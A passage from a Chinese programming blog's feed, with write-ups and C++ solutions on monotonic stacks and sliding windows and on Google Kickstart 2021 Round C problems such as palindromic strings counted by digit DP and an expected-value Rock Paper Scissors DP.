<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>kickstart</tag>
      </tags>
  </entry>
  <entry>
    <title>【算法】 mono stack</title>
    <url>/2022/11/20/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/69/</url>
    <content><![CDATA[<h1 id="mono-stack"><a href="#mono-stack" class="headerlink" title="mono stack"></a>mono stack</h1><p>最近在练习题目的时候经常遇到<code>mono stack</code>的题目，总的来说题目还是非常非常的有意思，单调栈真心是个利器。可以解决非常多的复杂的问题。可以利用单调栈求出以当前值为最大值或者最小值的连续子数组的最大长度。</p>
<h2 id="单调栈的原理"><a href="#单调栈的原理" class="headerlink" title="单调栈的原理"></a>单调栈的原理</h2><p>单调栈中的数据需要遵循两个原则：</p>
<ul>
<li>栈中的数据会是严格递增或者递减，则我们可以知道，假如单调栈中的数据为递减，则可以知道栈顶的数据一定为当前序列中最大的数据;假如单调栈中的数据为递增，则可以知道栈顶的数据一定为当前序列中最小的数据。一般情况下我们都会用<code>dequeue</code>来处理单调栈的数据，则可以知道队列的头部一定为当前序列中所求的最大值或者最小值。</li>
<li>为了保持单调性，则每当加入一个新的元素时，则会将栈中所有比当前元素小或者大的数据全部进行出栈，则由此我们可以判断如下，假设当前的栈为递减：<br><img src="https://i.loli.net/2021/05/11/xJKB3lbXmrjCZ6q.png" alt="1"><br>从图中可以看出我们可以在$O(1)$的时间复杂度内求出当前序列的极值。栈中任意相邻的两个元素比如$(arr[i],arr[j])$,则表示所有处于$(i,j)$之间的元素均小于$arr[j]$,有了这个重要的推论，则许多问题都可以利用这个特性来求解，比如我们知道假设某个元素<code>x</code>大于$arr[j]$,则表示<code>x</code>一定大于所有位于$[i+1,j]$之间的元素。下面有几个非常有代表性的题目需要讨论下：</li>
</ul>
<ol>
<li><a href="https://www.hackerrank.com/challenges/deque-stl/problem">找到子数组长度为k的最大值</a></li>
<li><a href="https://binarysearch.com/problems/Longest-Sublist-with-Value-Range-Condition">Longest Sublist with Value Range Condition</a></li>
<li><a href="https://leetcode-cn.com/problems/maximum-subarray-min-product/">子数组最小乘积的最大值</a></li>
<li><a href="https://leetcode-cn.com/problems/next-greater-element-i/">下一个更大元素 I</a></li>
<li><a href="https://leetcode-cn.com/problems/next-greater-element-ii/">下一个更大元素 II</a></li>
</ol>
<h2 id="下一个更大元素-II"><a href="#下一个更大元素-II" class="headerlink" title="下一个更大元素 II"></a>下一个更大元素 II</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>给定一个循环数组（最后一个元素的下一个元素是数组的第一个元素），输出每个元素的下一个更大元素。数字 x 的下一个更大的元素是按数组遍历顺序，这个数字之后的第一个比它更大的数，这意味着你应该循环地搜索它的下一个更大的数。如果不存在，则输出 -1。</p>
<h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/next-greater-element-ii">https://leetcode-cn.com/problems/next-greater-element-ii</a></p>
<h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote>
<p>  classical problem</p>
</blockquote>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol>
<li>首先题目中要求循环处理，这个很简单我们只需要在数组后面对数组本身再进行重复复制一遍即可，这样我们即可完成循环处理。</li>
<li>最经典的处理莫过于如何求第一个比其小或者大的数的处理，我们利用单调栈，所有小于当前的数全部从栈中弹出，因为我们知道一个推论为，栈中任意相邻的两个元素比如$(arr[i],arr[j])$,则表示所有处于$(i,j)$之间的元素均小于$arr[j]$,此时我们即可利用单调性很快求出所有的值。</li>
</ol>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">nextGreaterElements</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">            nums.<span class="built_in">push_back</span>(nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">ans</span><span class="params">(n,<span class="number">-1</span>)</span></span>;</span><br><span class="line">        deque&lt;<span class="type">int</span>&gt; dq;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); ++i)&#123;</span><br><span class="line">            <span class="keyword">while</span>(!dq.<span class="built_in">empty</span>() &amp;&amp; nums[dq.<span class="built_in">back</span>()] &lt; nums[i])&#123;</span><br><span class="line">                <span class="keyword">if</span>(dq.<span class="built_in">back</span>() &lt; n)&#123;</span><br><span class="line">                    ans[dq.<span class="built_in">back</span>()] = nums[i];</span><br><span class="line">                &#125;</span><br><span class="line">                dq.<span class="built_in">pop_back</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            dq.<span class="built_in">push_back</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="Longest-Sublist-with-Value-Range-Condition"><a href="#Longest-Sublist-with-Value-Range-Condition" class="headerlink" title="Longest Sublist with Value Range Condition"></a>Longest Sublist with Value Range Condition</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>Given a list of integers nums, return the length of the longest sublist where 2 * min(sublist) &gt; max(sublist).</p>
<p>Constraints</p>
<p>n ≤ 100,000 where n is the length of nums<br>Example 1<br>Input<br>nums &#x3D; [9, 1, 5, 5, 3, 3]<br>Output<br>4<br>Explanation<br>The sublist [5, 5, 3, 3] is the longest sublist that meet the criteria since 2 * 3 &gt; 5.</p>
<h3 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h3><p><a href="https://binarysearch.com/problems/Longest-Sublist-with-Value-Range-Condition">https://binarysearch.com/problems/Longest-Sublist-with-Value-Range-Condition</a></p>
<h3 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h3><blockquote>
<p>  双指针加单调栈</p>
</blockquote>
<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol>
<li>这个题目更加经典，需要同时利用单调栈和双指针。</li>
</ol>
<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">solve</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">    <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    deque&lt;<span class="type">int</span>&gt; minq;</span><br><span class="line">    deque&lt;<span class="type">int</span>&gt; maxq;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">        <span class="comment">// we remove all the element is more than nums[i]</span></span><br><span class="line">        <span class="keyword">while</span>(!minq.<span class="built_in">empty</span>() &amp;&amp; nums[minq.<span class="built_in">back</span>()] &gt; nums[i]) minq.<span class="built_in">pop_back</span>();</span><br><span class="line">        minq.<span class="built_in">push_back</span>(i);</span><br><span class="line">        <span class="comment">// we remove all the element is less than nums[i]</span></span><br><span class="line">        <span class="keyword">while</span>(!maxq.<span class="built_in">empty</span>() &amp;&amp; nums[maxq.<span class="built_in">back</span>()] &lt; nums[i]) maxq.<span class="built_in">pop_back</span>();</span><br><span class="line">        maxq.<span class="built_in">push_back</span>(i);</span><br><span class="line">        <span class="keyword">while</span>(!minq.<span class="built_in">empty</span>() &amp;&amp; !maxq.<span class="built_in">empty</span>() &amp;&amp; nums[maxq.<span class="built_in">front</span>()] &gt;= <span class="number">2</span>*nums[minq.<span class="built_in">front</span>()])&#123;</span><br><span class="line">            <span class="keyword">while</span>(!minq.<span class="built_in">empty</span>() &amp;&amp; minq.<span class="built_in">front</span>() &lt;= j) minq.<span class="built_in">pop_front</span>();</span><br><span class="line">            <span class="keyword">while</span>(!maxq.<span class="built_in">empty</span>() &amp;&amp; maxq.<span class="built_in">front</span>() &lt;= j) maxq.<span class="built_in">pop_front</span>();</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        ans = <span class="built_in">max</span>(ans,i-j+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="qiu"><a href="#qiu" class="headerlink" title="qiu"></a>qiu</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>Given a set of arrays of size  and an integer , you have to find the maximum integer for each and every contiguous subarray of size  for each of the given arrays.<br>nput Format</p>
<p>First line of input will contain the number of test cases T. For each test case, you will be given the size of array N and the size of subarray to be used K. This will be followed by the elements of the array Ai.</p>
<p>Constraints, where  is the  element in the array .</p>
<p>Output Format</p>
<p>For each of the contiguous subarrays of size  of each array, you have to print the maximum integer.</p>
<p>Sample Input</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2</span><br><span class="line">5 2</span><br><span class="line">3 4 6 3 4</span><br><span class="line">7 4</span><br><span class="line">3 4 5 8 1 4 10</span><br></pre></td></tr></table></figure>
<p>Sample Output</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4 6 6 4</span><br><span class="line">8 8 8 10</span><br></pre></td></tr></table></figure>
<h3 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h3><p><a href="https://www.hackerrank.com/challenges/deque-stl/problem">https://www.hackerrank.com/challenges/deque-stl/problem</a></p>
<h3 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h3><blockquote>
<p>  单调栈 + 滑动窗口</p>
</blockquote>
<h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><ol>
<li>这个题目更加经典，需要同时利用单调栈和双指针。利用单调性，单调栈中的栈头一定保存的是当前序列的最大值。同时利用滑动窗口，一旦窗口超过队头的元素，则将队头的元素进行删除即可。</li>
</ol>
<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;deque&gt;</span> </span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printKMax</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> n, <span class="type">int</span> k)</span></span>&#123;</span><br><span class="line">	<span class="comment">//Write your code here.</span></span><br><span class="line">    deque&lt;<span class="type">int</span>&gt; dq;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">        <span class="keyword">while</span>(!dq.<span class="built_in">empty</span>() &amp;&amp; arr[i] &gt; arr[dq.<span class="built_in">back</span>()])&#123;</span><br><span class="line">            dq.<span class="built_in">pop_back</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        dq.<span class="built_in">push_back</span>(i);</span><br><span class="line">        <span class="keyword">while</span>((i-j+<span class="number">1</span>) &gt; k)&#123;</span><br><span class="line">            <span class="keyword">while</span>(!dq.<span class="built_in">empty</span>() &amp;&amp; dq.<span class="built_in">front</span>() &lt;= j) dq.<span class="built_in">pop_front</span>();</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i+<span class="number">1</span> &gt;= k)&#123;</span><br><span class="line">            cout&lt;&lt;arr[dq.<span class="built_in">front</span>()]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  </span><br><span class="line">	<span class="type">int</span> t;</span><br><span class="line">	cin &gt;&gt; t;</span><br><span class="line">	<span class="keyword">while</span>(t&gt;<span class="number">0</span>) &#123;</span><br><span class="line">		<span class="type">int</span> n,k;</span><br><span class="line">    	cin &gt;&gt; n &gt;&gt; k;</span><br><span class="line">    	<span class="type">int</span> i;</span><br><span class="line">    	<span class="type">int</span> arr[n];</span><br><span class="line">    	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">      		cin &gt;&gt; arr[i];</span><br><span class="line">    	<span class="built_in">printKMax</span>(arr, n, k);</span><br><span class="line">    	t--;</span><br><span class="line">  	&#125;</span><br><span class="line">  	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>【kickstart】 kickstart 2021 roundC</title>
    <url>/2022/11/20/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/67/</url>
    <content><![CDATA[<h1 id="kickstart-2021-roundC"><a href="#kickstart-2021-roundC" class="headerlink" title="kickstart 2021 roundC"></a>kickstart 2021 roundC</h1><p>最喜欢的<code>kcick start</code>来了，但是由于本次<code>round</code>的时候家里有事，正在陪小孩一直也没有时间来参加，所以只能等到比赛结束后来补上了，非常喜欢<code>google kickstart</code>的题目，质量很高又非常有趣。</p>
<h2 id="a-Smaller-Strings-6pts-9pts"><a href="#a-Smaller-Strings-6pts-9pts" class="headerlink" title="a.Smaller Strings (6pts, 9pts)"></a>a.Smaller Strings (6pts, 9pts)</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p><img src="https://i.loli.net/2021/05/24/sOrgvzPI2GpiQMl.png" alt="1"></p>
<h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p><a href="https://codingcompetitions.withgoogle.com/kickstart/round/0000000000435c44/00000000007ebe5e">https://codingcompetitions.withgoogle.com/kickstart/round/0000000000435c44/00000000007ebe5e</a></p>
<h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote>
<p>  数位<code>dp</code></p>
</blockquote>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol>
<li>题目中要求给定的字符串<code>s</code>，长度为<code>n</code>，给定最大字符k,求所出长度为<code>n</code>的且字典序严格小于<code>s</code>的回文字符串的个数，且构成的回文子符串中所有的字符均小于等于<code>k</code>。</li>
<li>典型的数位<code>dp</code>.由于是回文字符串，因此我们只需要找到字符串的前半部分即可，因为后半部分与前半部分相同，我们设<code>dp[i]</code>表示字符串长度为<code>i</code>且符合最大字符小于等于<code>k</code>，且字典序严格小于字符串<code>s</code>的前<code>i</code>个字符构成的字符串的个数。<code>limit</code>表示当前字符串<code>s</code>中的前<code>i</code>个字符是否存在字符大于等于<code>k</code>，<code>limit = 1</code>表示不存在不符合要求的字符，<code>limit = 0</code>表示存在大于<code>k</code>的字符。</li>
<li>我们可以知道递推公式：<br>当我们选择第<code>i</code>个字符时：</li>
</ol>
<ul>
<li>如果当前字符串的前<code>i-1</code>个字符构成的字符串的字典序严格小于<code>s</code>的前<code>i-1</code>个字符构成的字典序，则在第<code>i</code>个字符我们可以在<code>[a,a+k]</code>中我们可以任意取值;</li>
<li>如果当前字符串的前<code>i-1</code>个字符构成的字符串刚好等于<code>s</code>的前<code>i-1</code>个字符构成的字符串，则第<code>i</code>位我们就只能取严格小于<code>s[i]</code>且小于等于<code>“a&quot;+k</code>的字符;</li>
</ul>
<ol start="4">
<li>最后需要检测一下，如果把整个数组的前半部分全部转换为回文字符串，则此时需要去检查是否字典序严格小于字符串$s$,算法时间复杂度为$O(n)$.</li>
</ol>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">slove</span><span class="params">(<span class="type">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n,k;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line">    string s;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;k;</span><br><span class="line">    cin&gt;&gt;s;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*dp*/</span></span><br><span class="line">    <span class="type">int</span> m = (n+<span class="number">1</span>)/<span class="number">2</span>;</span><br><span class="line">    <span class="type">int</span> limit = <span class="number">1</span>;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">dp</span><span class="params">(m)</span></span>;</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="built_in">min</span>(s[<span class="number">0</span>]-<span class="string">&#x27;a&#x27;</span>,k);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; m; ++i)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i] -<span class="string">&#x27;a&#x27;</span> + <span class="number">1</span> &gt; k)&#123;</span><br><span class="line">            dp[i] = (dp[i<span class="number">-1</span>]*k + k)%mod;</span><br><span class="line">            limit = <span class="number">0</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            dp[i] = (dp[i<span class="number">-1</span>]*k + limit*(s[i]-<span class="string">&#x27;a&#x27;</span>))%mod;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ans = dp[m<span class="number">-1</span>];</span><br><span class="line">    <span class="keyword">if</span>(limit)&#123;</span><br><span class="line">        string p = s;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; ++i)&#123;</span><br><span class="line">            p[n<span class="number">-1</span>-i] = p[i] = s[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(p &lt; s) ans = (ans + <span class="number">1</span>)%mod;</span><br><span class="line">    &#125;</span><br><span class="line">    ans = ans%mod;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Case #&quot;</span>&lt;&lt;t&lt;&lt;<span class="string">&quot;: &quot;</span>;</span><br><span class="line">    cout&lt;&lt;ans;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        <span class="built_in">slove</span>(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="b-Alien-Generato"><a href="#b-Alien-Generato" class="headerlink" title="b. Alien Generato"></a>b. Alien Generato</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p><img src="https://i.loli.net/2021/05/24/XPFzfylCS1mekWO.png" alt="1"></p>
<h3 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h3><p><a href="https://codingcompetitions.withgoogle.com/kickstart/round/0000000000435c44/00000000007ec1cb">https://codingcompetitions.withgoogle.com/kickstart/round/0000000000435c44/00000000007ec1cb</a></p>
<h3 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h3><blockquote>
<p> 数学计算</p>
</blockquote>
<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol>
<li>这个题目非常简单，感觉就是送分题，也就<code>leetcode</code>中等难度的题目。</li>
<li>我们得出计算公式为:<br>$$<br>g &#x3D; n*k + \frac{(n-1)*n}{2} \<br>k &#x3D; \frac{g-\frac{(n-1)*n}{2}}{n}<br>$$<br>此时我们只需要判断$g-\frac{(n-1)*n}{2}$是否能够整除$n$即可，且商大于等于<code>1</code>.</li>
<li>我们很轻易的可以判断$n \le \sqrt{g}$,我们只需要暴力测试所有可能的<code>n</code>即可。算法时间复杂度为$O(lgn)$.</li>
</ol>
<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">slove</span><span class="params">(<span class="type">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> g;</span><br><span class="line"></span><br><span class="line">    cin&gt;&gt;g;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> curr = <span class="built_in">sqrt</span>(g)*<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> i = <span class="number">1</span>; i &lt;= curr; ++i)&#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> x = i*(i<span class="number">-1</span>)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(x &gt;= g) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span>((g-x)%i == <span class="number">0</span>)&#123;</span><br><span class="line">            ans++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Case #&quot;</span>&lt;&lt;t&lt;&lt;<span class="string">&quot;: &quot;</span>;</span><br><span class="line">    cout&lt;&lt;ans;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        <span class="built_in">slove</span>(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="c-Rock-Paper-Scissors"><a href="#c-Rock-Paper-Scissors" class="headerlink" title="c.Rock Paper Scissors"></a>c.Rock Paper Scissors</h2><p><img src="https://i.loli.net/2021/05/24/EBjb4TSs5GKWtun.png"></p>
<h3 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h3><p><a href="https://codingcompetitions.withgoogle.com/kickstart/round/0000000000435c44/00000000007ec28e">https://codingcompetitions.withgoogle.com/kickstart/round/0000000000435c44/00000000007ec28e</a></p>
<h3 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h3><blockquote>
<p> 动态规划</p>
</blockquote>
<h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><ol>
<li>这个题目非常有意思的<code>dp</code>,题目很长，大意就是说两个人玩石头剪刀布的游戏，每个人每轮可以在<code>(r,p,s)</code>分别代表石头、剪刀、布中任意选择一个，石头可以赢剪刀，剪刀可以赢布，布可以赢石头。对方在第<code>i</code>轮出手时，会根据当前已方已经出手的统计次数，来计算出自己选择的概率。假设第<code>i</code>轮时，已方已经出示过的石头、布、剪刀的统计次数分别为$(r_{i},p_{i},s_{i})$,且已知$r_{i} + p_{i} + s_{i} &#x3D; i$,则在第<code>i+1</code>轮时，对方选择出示石头的概率为$\frac{s_{i}}{i}$，选择布的概率为$\frac{r_{i}}{i}$,选择剪刀的概率为$\frac{p_{i}}{i}$.需要注意的是，在第<code>1</code>轮时，因为没有前面轮次的统计数据，则对方选择出示石头剪刀布的概率均为$\frac{1}{3}$,每天一共需要进行游戏<code>60</code>轮，每天给定每一局赢时获得的分数<code>W</code>，以及平局是获得的分数<code>E</code>，给定一个特定的分数<code>X</code>，求出游戏进行<code>T</code>天后，每天的期望的平均值大于等于<code>X</code>的每天的游戏的出牌方案。</li>
<li>这个题目很长，初看起来还是非常的复杂，不过仔细思考一下，其实也不算是特别难的。首先需要思考的几点:</li>
</ol>
<ul>
<li>题目要求给定满足期望平均值大于等于<code>X</code>的方案，那么假设我们每天都以期望最大值即最优的方案来出牌，肯定可以满足题意。所以我们就不用再去讨论其他的可能的方案，按照这个思路转化，本题即转换为求出每天期望值最大的出牌方案。</li>
<li>如果求出期望最大值的方案？实际上应该有多少种组合，我们如果每一轮都按照该轮期望最大值的方案进行出牌是不是一定能够得到最终的期望的最大值？这几个问题是值得深入思考的。</li>
<li>试想如果我们把所有的出牌的顺序的期望值都求一遍，肯定可以求得期望最大值的方案，则此时的算法时间复杂度为$3^{60}$,肯定会超时，有没有可能更简单的枚举方法可以来求？则此时我们应该想到用动态规划的子状态，我们设<code>dp[r][p][s]</code>表示当前已方已经出示了$r$次石头，$p$次布，$s$次剪刀时的最大期望值，则我们可以发现此时游戏一共进行了$ t &#x3D; r + p + s$轮，则我们发现最优状态与第<code>t</code>轮的选择有直接关系。</li>
<li>我们发现最优状态之间存在关系如下：</li>
<li><ul>
<li>假设第<code>t</code>轮己方选择的是石头，则第<code>t</code>轮对方选择为剪刀时己方会赢,而此时对方选择为剪刀的概率为$\frac{p}{r+p+s-1}$;对方选择的是石头时，己方会平局，则此时对方选择为石头的概率为$\frac{s}{r+p+s-1}$.因此我们可以推导如下：<br>$$<br>dp[r][p][s] &#x3D; max(dp[r][p][s],dp[r-1][p][s] + W<em>\frac{p}{r+p+s-1} + E</em>\frac{s}{r+p+s-1})<br>$$</li>
</ul>
</li>
<li><ul>
